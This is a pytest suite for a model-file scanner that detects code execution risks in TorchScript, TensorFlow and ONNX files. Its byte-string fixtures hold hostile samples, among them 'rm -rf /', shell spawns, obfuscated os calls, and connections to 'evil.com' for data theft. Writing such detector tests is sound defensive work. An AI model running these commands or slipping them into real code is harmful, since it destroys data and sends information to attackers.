"""Tests for JIT/Script code execution detection."""

import ast
from pathlib import Path

import pytest

from modelaudit.detectors import jit_script as jit_script_module
from modelaudit.detectors.jit_script import JITScriptDetector, detect_jit_script_risks


class TestJITScriptDetector:
    """Test the JITScriptDetector class."""

    def test_detect_dangerous_torch_ops(self):
        """Test detection of dangerous TorchScript operations."""
        detector = JITScriptDetector()

        # Create fake TorchScript data with dangerous operations
        data = b"""
        TorchScript-1.0
        def forward(self, x):
            torch.ops.aten.system("rm -rf /")
            torch.ops.aten.exec("malicious code")
            return x
        """

        findings = detector.scan_torchscript(data, "test_model.pt")
        assert len(findings) >= 2
        assert any("torch.ops.aten.system" in getattr(f, "pattern", getattr(f, "operation", "")) for f in findings)
        assert any("torch.ops.aten.exec" in getattr(f, "pattern", getattr(f, "operation", "")) for f in findings)
        assert all(
            getattr(f, "severity", getattr(f, "severity", "")) == "CRITICAL"
            for f in findings
            if hasattr(f, "pattern") or hasattr(f, "operation")
        )

    def test_detect_torch_jit_compilation(self):
        """Test detection of TorchScript JIT compilation."""
        detector = JITScriptDetector({"strict_mode": True})

        # Create data with JIT markers
        data = b"""
        torch.jit.script
        @torch.jit.compile
        def model_func():
            pass
        """

        findings = detector.scan_torchscript(data, "jit_model.pt")
        assert any(f.type == "jit_usage" for f in findings)

    def test_detect_embedded_pickle_in_torch(self):
        """Test detection of embedded pickle in TorchScript."""
        detector = JITScriptDetector()

        # Simulate TorchScript with pickle opcodes
        data = b"TorchScript\x00GLOBAL torch.nn Module\x00"

        findings = detector.scan_torchscript(data)
        assert any(f.type == "embedded_pickle" for f in findings)
        assert any("pickle" in f.message.lower() for f in findings)

    def test_detect_dangerous_tf_ops(self):
        """Test detection of dangerous TensorFlow operations."""
        detector = JITScriptDetector()

        # Create fake TensorFlow SavedModel data
        data = b"""
        saved_model.pb
        tf.py_func(lambda x: exec('malicious'), [input])
        tf.numpy_function(dangerous_func, [x], tf.float32)
        """

        findings = detector.scan_tensorflow(data, "model.pb")
        assert len(findings) >= 2
        assert any(f.operation is not None and "tf.py_func" in f.operation for f in findings)
        assert any(f.operation is not None and "tf.numpy_function" in f.operation for f in findings)

    def test_detect_keras_lambda_layers(self):
        """Test detection of Keras Lambda layers."""
        detector = JITScriptDetector()

        # Create data with Keras Lambda layer
        data = b"""
        tensorflow.keras.layers.Lambda
        lambda x: eval(x)
        """

        findings = detector.scan_tensorflow(data)
        assert any(f.type == "lambda_layer" for f in findings)
        assert any("Lambda" in f.message for f in findings)

    def test_detect_onnx_custom_operators(self):
        """Test detection of ONNX custom operators."""
        detector = JITScriptDetector()

        # Create fake ONNX data with custom operators
        data = b"""
        ai.onnx.contrib.custom_op
        PythonOp: eval_code
        """

        findings = detector.scan_onnx(data, "model.onnx")
        assert any(f.type == "custom_operator" for f in findings)
        assert any(f.type == "python_operator" for f in findings)

    def test_detect_dangerous_imports_in_code(self):
        """Test detection of dangerous imports in embedded code."""
        detector = JITScriptDetector()

        # Create data with embedded Python code containing dangerous imports
        data = b"""
        def malicious_function():
            import os
            import subprocess
            os.system('evil command')
            subprocess.call(['rm', '-rf', '/'])
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("os" in getattr(f, "import_", "") for f in findings)
        assert any("subprocess" in getattr(f, "import_", "") for f in findings)
        assert any(f.severity == "CRITICAL" for f in findings)

    def test_known_dangerous_import_reuses_compiled_patterns(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Known import checks should not rebuild regex source at call time."""

        def fail_escape(_value: str) -> str:
            raise AssertionError("known import checks should reuse compiled patterns")

        monkeypatch.setattr(jit_script_module.re, "escape", fail_escape)

        assert JITScriptDetector._contains_dangerous_import("import os\n", "os") is True

    def test_scan_torchscript_checks_unmarked_python_blobs(self) -> None:
        """Raw Python payloads should be analyzed even without TorchScript markers."""
        detector = JITScriptDetector()
        data = b"""
        def payload():
            import os
            return os.system("echo pwned")
        """

        findings = detector.scan_torchscript(data, "opaque.bin")

        assert any(getattr(finding, "import_", "") == "os" for finding in findings)

    def test_detect_dangerous_builtins(self):
        """Test detection of dangerous builtins like eval, exec."""
        detector = JITScriptDetector()

        data = b"""
        def process_input(x):
            result = eval(x)
            exec(compile(x, 'string', 'exec'))
            return __import__('os').system(result)
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("eval" in getattr(f, "builtin", "") for f in findings)
        assert any("exec" in getattr(f, "builtin", "") for f in findings)
        assert any("__import__" in getattr(f, "builtin", "") for f in findings)

    def test_detect_code_execution_patterns(self):
        """Test detection of code execution patterns in binary data."""
        detector = JITScriptDetector()

        # Create data with various execution patterns
        data = b"""
        subprocess.run(['malicious', 'command'])
        os.system('rm -rf /')
        socket.create_connection(('evil.com', 1337))
        urllib.request.urlopen('http://evil.com/steal')
        open('/etc/passwd', 'w').write('hacked')
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("subprocess" in getattr(f, "pattern", "").lower() for f in findings)
        assert any("os command" in getattr(f, "pattern", "").lower() for f in findings)
        assert any("socket" in getattr(f, "pattern", "").lower() for f in findings)

    def test_auto_detect_model_type(self) -> None:
        """Test automatic model type detection."""
        detector = JITScriptDetector()

        # Test PyTorch detection
        pytorch_data = b"TorchScript model data"
        pytorch_findings = detector.scan_model(pytorch_data, "unknown")
        assert isinstance(pytorch_findings, list)

        # Test TensorFlow detection
        tf_data = b"saved_model.pb tensorflow data"
        tf_findings = detector.scan_model(tf_data, "unknown")
        assert isinstance(tf_findings, list)

        # Test ONNX detection
        onnx_data = b"ai.onnx model data"
        onnx_findings = detector.scan_model(onnx_data, "unknown")
        assert isinstance(onnx_findings, list)

    def test_scan_model_detects_unmarked_dangerous_python_source(self) -> None:
        detector = JITScriptDetector()
        data = b"""
        def payload():
            import os
            return eval("1 + 1") or os.system("id")
        """

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)
        assert any(f.type == "dangerous_builtin" and f.builtin == "eval" for f in findings)

    def test_scan_model_ignores_unmarked_benign_python_source(self) -> None:
        detector = JITScriptDetector()
        data = b"""
        def normalize(values):
            total = sum(values)
            return [value / total for value in values]
        """

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_ignores_non_source_dangerous_text(self) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(b"metadata says eval( is unsupported", "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_detects_unmarked_module_scope_python_source(self) -> None:
        detector = JITScriptDetector()
        findings = detector.scan_model(b"import os\nos.system('id')\n", "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    def test_scan_model_detects_late_unmarked_module_scope_python_source(self) -> None:
        detector = JITScriptDetector()
        data = b"# pad\n" * 200000 + b"import os\nos.system('id')\n"

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    def test_scan_model_detects_unmarked_from_import_source(self) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(b"from os import system as run\nrun('id')\n", "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    return os.posix_spawn('/bin/sh', ['sh'], {})\n",
            b"def payload():\n    return os.posix_spawnp('sh', ['sh'], {})\n",
            b"def payload():\n    return os.startfile('payload.exe')\n",
            b"def payload():\n    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], {})\n",
            b"def payload():\n    os.posix_spawn = len\n    return os.posix_spawn([])\n",
            b"def payload(data):\n    os.posix_spawn = pickle.loads\n    return os.posix_spawn(data)\n",
        ],
    )
    def test_scan_model_detects_os_process_launch_source_conservatively(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_ignores_string_literal_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = b"def payload():\n    return \"os.posix_spawn('/bin/sh', ['sh'], {})\"\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_ignores_binary_framed_string_literal_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    return \"os.posix_spawn('/bin/sh', ['sh'], {})\"\n}"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_ignores_string_literal_os_process_launch_with_unrelated_risk(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"import pickle\n\n"
            b"def payload(data):\n"
            b"    pickle.loads(data)\n"
            b"    return \"os.posix_spawn('/bin/sh', ['sh'], {})\"\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            (
                b"import os\n"
                b"import subprocess\n\n"
                b"def payload(args):\n"
                b"    marker = os.posix_spawn\n"
                b"    return subprocess.list2cmdline(args)\n"
            ),
            (
                b"import os\n"
                b"import subprocess\n\n"
                b"def payload():\n"
                b"    marker = os.posix_spawn\n"
                b"    return subprocess.run(['echo', 'ok'], check=False)\n"
            ),
        ],
    )
    def test_scan_model_ignores_uninvoked_os_process_reference_with_unrelated_risk(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_detects_embedded_snippet_alias_aware_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import os\n"
            b"    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], {})\n"
            b"}"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_detects_embedded_snippet_alias_aware_os_process_launch_before_binary_tail(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import os\n"
            b"    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], dict())\n"
            b"\x00\xffMODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_detects_framed_module_import_alias_aware_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffimport os\ndef payload():\n    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], {})\n}"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_allows_framed_benign_dict_literal_os_accessor(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    import os\n    return {'cwd': getattr(os, 'getcwd')()}\n}"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"async def payload():\n    return await asyncio.create_subprocess_shell('id')\n",
            b"async def payload():\n    return await asyncio.subprocess.create_subprocess_exec('id')\n",
            (
                b"from asyncio import create_subprocess_exec as launch\n"
                b"async def payload():\n    return await launch('id')\n"
            ),
            (
                b"async def payload():\n"
                b"    asyncio.create_subprocess_shell = len\n"
                b"    return asyncio.create_subprocess_shell([])\n"
            ),
            (
                b"async def payload(data):\n"
                b"    asyncio.create_subprocess_exec = pickle.loads\n"
                b"    return asyncio.create_subprocess_exec(data)\n"
            ),
        ],
    )
    def test_scan_model_detects_asyncio_subprocess_launch_source_conservatively(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_ignores_string_literal_asyncio_subprocess_launch_with_unrelated_risk(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"import pickle\n\n"
            b"def payload(data):\n"
            b"    pickle.loads(data)\n"
            b"    return \"asyncio.create_subprocess_shell('id')\"\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_ignores_binary_framed_string_literal_asyncio_subprocess_launch(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    return \"asyncio.create_subprocess_shell('id')\"\n\x00\xffMODEL-FRAMING"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_ignores_lossy_decoded_string_literal_asyncio_subprocess_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    # ignored invalid bytes: "
            + (b"\xff" * 64)
            + b"\n    return \"asyncio.create_subprocess_shell('id')\"\n\x00\xffMODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_parse_embedded_python_snippet_caps_trim_attempts(self, monkeypatch: pytest.MonkeyPatch) -> None:
        parse_calls = 0

        def fail_parse(_source: str) -> ast.AST:
            nonlocal parse_calls
            parse_calls += 1
            raise SyntaxError("bad syntax", ("<embedded>", 1, 1, "bad"))

        monkeypatch.setattr(jit_script_module.ast, "parse", fail_parse)

        tree = jit_script_module._parse_embedded_python_snippet(
            "def payload():\n" + "\n".join("bad" for _ in range(1000))
        )

        assert tree is None
        assert parse_calls <= jit_script_module._MAX_SNIPPET_PARSE_TRIM_ATTEMPTS + 2

    def test_scan_model_detects_binary_framed_long_tail_alias_aware_asyncio_subprocess_launch(self) -> None:
        detector = JITScriptDetector()
        tail = b"\n".join(b"tail" for _ in range(jit_script_module._MAX_SNIPPET_PARSE_TRIM_ATTEMPTS + 20))
        source = (
            b"\x00\xffdef payload():\n"
            b"    from asyncio import create_subprocess_shell as launch\n"
            b"    return launch('id')\n"
            b"\x00" + tail
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_detects_binary_framed_long_tail_alias_aware_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        tail = b"\n".join(b"tail" for _ in range(jit_script_module._MAX_SNIPPET_PARSE_TRIM_ATTEMPTS + 20))
        source = b"\x00\xffdef payload():\n    import os as o\n    return getattr(o, 'system')('id')\n\x00" + tail

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_preserves_raw_asyncio_match_in_unparsed_snippet_after_benign_parse(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def benign():\n"
            b"    return \"asyncio.create_subprocess_shell('id')\"\n"
            b"}\n"
            b"def payload():\n"
            b"if True print('broken')\n"
            b"asyncio.create_subprocess_shell('id')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_detects_embedded_snippet_alias_aware_asyncio_subprocess_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    from asyncio import create_subprocess_shell as launch\n"
            b"    return launch('id')\n"
            b"}"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    return runpy._run_module_as_main('payload')\n",
            b"def payload():\n    return runpy.run_module('payload')\n",
            b"def payload():\n    from runpy import run_path as run\n    return run('payload.py')\n",
        ],
    )
    def test_scan_model_detects_unmarked_runpy_execution(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_certain_replaced_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"def payload():\n    runpy.run_path = len\n    return runpy.run_path([])\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_preserves_possible_runpy_execution_after_conditional_replacement(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n    if replace:\n        runpy.run_path = len\n    return runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_binary_prefixed_aliased_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    from runpy import run_path as run\n    return run('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_binary_framed_top_level_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xfffrom runpy import run_path as run\nrun('payload.py')\n\x00MODEL-FRAMING"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_binary_framed_top_level_replaced_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffimport runpy\nrunpy.run_path = len\nrunpy.run_path([])\n\x00MODEL-FRAMING"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_binary_framed_long_tail_alias_aware_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        tail = b"\n".join(b"tail" for _ in range(jit_script_module._MAX_SNIPPET_PARSE_TRIM_ATTEMPTS + 20))
        source = (
            b"\x00\xffdef payload():\n    from runpy import run_path as run\n    return run('payload.py')\n\x00" + tail
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_binary_prefixed_replaced_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    import runpy\n    runpy.run_path = len\n    return runpy.run_path([])\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_ignores_lossy_decoded_string_literal_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    # ignored invalid bytes: "
            + (b"\xff" * 64)
            + b"\n    return \"runpy.run_path('payload.py')\"\n\x00\xffMODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_raw_runpy_match_after_benign_parsed_snippet(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def benign():\n"
            b"    return \"runpy.run_path('payload.py')\"\n"
            b"}\n"
            b"def payload():\n"
            b"if True print('broken')\n"
            b"runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_binary_framed_webbrowser_and_ctypes_calls(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    import webbrowser\n"
            b"    webbrowser.get().open.__call__('https://example.invalid')\n"
            b"    webbrowser.get().__getattribute__('open')('https://example.invalid')\n"
            b"    ctypes.windll.kernel32\n"
            b"    ctypes.cdll['msvcrt'].printf(b'x')\n"
            b"    ctypes.cdll.__getitem__('msvcrt')\n"
            b"    loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader_kw = ctypes.LibraryLoader(dlltype=ctypes.CDLL)\n"
            b"    loader_alias = ctypes.LibraryLoader(ctypes.cdll._dlltype)\n"
            b"    loader_method = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader.msvcrt.printf(b'x')\n"
            b"    loader_kw.payload.printf(b'x')\n"
            b"    loader_alias.aliaslib.printf(b'x')\n"
            b"    loader_method.LoadLibrary('methodlib')\n"
            b"    loader_method.__getitem__('getitemlib')\n"
            b"    loader_variable = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    library_name = 'variablelib'\n"
            b"    loader_variable.LoadLibrary(library_name)\n"
            b"    loader_variable.__getitem__(library_name)\n"
            b"    class MyCDLL(ctypes.CDLL):\n"
            b"        pass\n"
            b"    ctypes.LibraryLoader(MyCDLL).subclasslib\n"
            b"    getattr(ctypes.windll, 'user32')\n"
            b"    ctypes.windll.__getattr__('advapi32')\n"
            b"    return getattr(ctypes.LibraryLoader(ctypes.CDLL), 'attrlib')\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        patterns = {finding.pattern for finding in findings if finding.type == "code_execution_pattern"}
        assert "Web browser launch detected" in patterns
        assert "Native library loading detected" in patterns

    def test_scan_model_preserves_dynamic_member_risk_after_conditional_overwrite(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    import webbrowser\n"
            b"    browser = webbrowser.get()\n"
            b"    if replace:\n"
            b"        browser.open = len\n"
            b"        ctypes.windll.kernel32 = len\n"
            b"    browser.open('https://example.invalid')\n"
            b"    return ctypes.windll.kernel32\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        patterns = {finding.pattern for finding in findings if finding.type == "code_execution_pattern"}
        assert "Web browser launch detected" in patterns
        assert "Native library loading detected" in patterns

    def test_scan_model_ignores_safe_webbrowser_get_overwrite(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import webbrowser\n"
            b"    webbrowser.get = len\n"
            b"    return webbrowser.get([]).open('https://example.invalid')\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_ignores_safe_webbrowser_method_overwrite_and_invalid_libraryloader(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    import webbrowser\n"
            b"    browser = webbrowser.get()\n"
            b"    browser.open = len\n"
            b"    browser.open([])\n"
            b"    loader = ctypes.LibraryLoader(len)\n"
            b"    loader.payload.printf(b'x')\n"
            b"    load = ctypes.cdll.LoadLibrary\n"
            b"    class_attr = ctypes.LibraryLoader.payload\n"
            b"    ctypes.windll.kernel32 = len\n"
            b"    getattr(ctypes.windll, 'kernel32')\n"
            b"    ctypes.windll.__getattr__('kernel32')\n"
            b"    ctypes.LibraryLoader = len\n"
            b"    ctypes.LibraryLoader(ctypes.CDLL).payload\n"
            b"    return load.__name__\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern"
            and finding.pattern in {"Web browser launch detected", "Native library loading detected"}
            for finding in findings
        )

    def test_strict_mode(self) -> None:
        """Test strict mode flags any JIT usage."""
        detector_normal = JITScriptDetector({"strict_mode": False})
        detector_strict = JITScriptDetector({"strict_mode": True})

        data = b"TorchScript torch.jit.script"

        findings_normal = detector_normal.scan_torchscript(data)
        findings_strict = detector_strict.scan_torchscript(data)

        assert not any(f.type == "jit_usage" for f in findings_normal)
        # Strict mode should flag JIT usage
        assert any(f.type == "jit_usage" for f in findings_strict)
        # Normal mode might not flag it as severely
        strict_warnings = [f for f in findings_strict if f.type == "jit_usage"]
        assert len(strict_warnings) > 0

    def test_custom_dangerous_ops(self):
        """Test adding custom dangerous operations."""
        config = {
            "custom_dangerous_ops": {
                "torch": ["my.custom.dangerous.op"],
                "tf": ["tf.my.dangerous.function"],
            }
        }
        detector = JITScriptDetector(config)

        # Test custom Torch op
        torch_data = b"my.custom.dangerous.op(payload)"
        findings = detector.scan_torchscript(torch_data)
        assert any("my.custom.dangerous.op" in getattr(f, "operation", "") for f in findings)

        # Test custom TF op
        tf_data = b"tf.my.dangerous.function(exploit)"
        findings = detector.scan_tensorflow(tf_data)
        assert any("tf.my.dangerous.function" in getattr(f, "operation", "") for f in findings)

    def test_ast_analysis(self):
        """Test Python AST analysis for dangerous patterns."""
        detector = JITScriptDetector()

        # Valid Python code with dangerous patterns
        python_code = b"""
def malicious():
    import os
    from subprocess import call

    eval('dangerous')
    exec(compile('code', 'string', 'exec'))
    __import__('sys').exit()
"""

        findings = detector._extract_and_check_python_code(python_code, "Test", "test")

        # Should detect through AST analysis
        ast_findings = [f for f in findings if "ast_" in getattr(f, "type", "")]
        assert len(ast_findings) > 0
        assert any("os" in getattr(f, "import_", "") for f in ast_findings)


class TestDetectJITScriptRisks:
    """Test the convenience function for file scanning."""

    def test_scan_file(self, tmp_path):
        """Test scanning a file for JIT/Script risks."""
        # Create a test file with dangerous content
        test_file = tmp_path / "model.pt"
        test_file.write_bytes(b"TorchScript\ntorch.ops.aten.system('evil')")

        findings = detect_jit_script_risks(str(test_file))
        assert len(findings) > 0
        assert any("torch.ops.aten.system" in str(f) for f in findings)

    def test_scan_file_detects_unmarked_dangerous_python_source(self, tmp_path: Path) -> None:
        test_file = tmp_path / "payload.bin"
        test_file.write_bytes(
            b"""
            def payload():
                import os
                return os.system("id")
            """
        )

        findings = detect_jit_script_risks(str(test_file))

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    def test_file_not_found(self):
        """Test handling of non-existent files."""
        findings = detect_jit_script_risks("/non/existent/file.pt")
        assert len(findings) == 1
        assert findings[0].type == "error"
        assert "not found" in findings[0].message

    def test_file_too_large(self, tmp_path):
        """Test handling of files that are too large."""
        large_file = tmp_path / "large.pt"
        large_file.write_bytes(b"x" * 100)

        # Test with very small max_size
        findings = detect_jit_script_risks(str(large_file), max_size=50)
        assert len(findings) == 1
        assert findings[0].type == "error"
        assert "too large" in findings[0].message

    def test_model_type_detection_from_extension(self, tmp_path):
        """Test that model type is detected from file extension."""
        # Test PyTorch extensions
        for ext in [".pt", ".pth", ".pts", ".torchscript"]:
            test_file = tmp_path / f"model{ext}"
            test_file.write_bytes(b"torch.ops.aten.exec('bad')")
            findings = detect_jit_script_risks(str(test_file))
            assert any("torch.ops.aten.exec" in str(f) for f in findings)

        # Test TensorFlow extensions
        for ext in [".pb", ".h5", ".keras"]:
            test_file = tmp_path / f"model{ext}"
            test_file.write_bytes(b"tf.py_func(evil)")
            findings = detect_jit_script_risks(str(test_file))
            assert any("tf.py_func" in str(f) for f in findings)

        # Test ONNX extension
        test_file = tmp_path / "model.onnx"
        test_file.write_bytes(b"PythonOp custom")
        findings = detect_jit_script_risks(str(test_file))
        assert any("Python operator" in str(f) for f in findings)
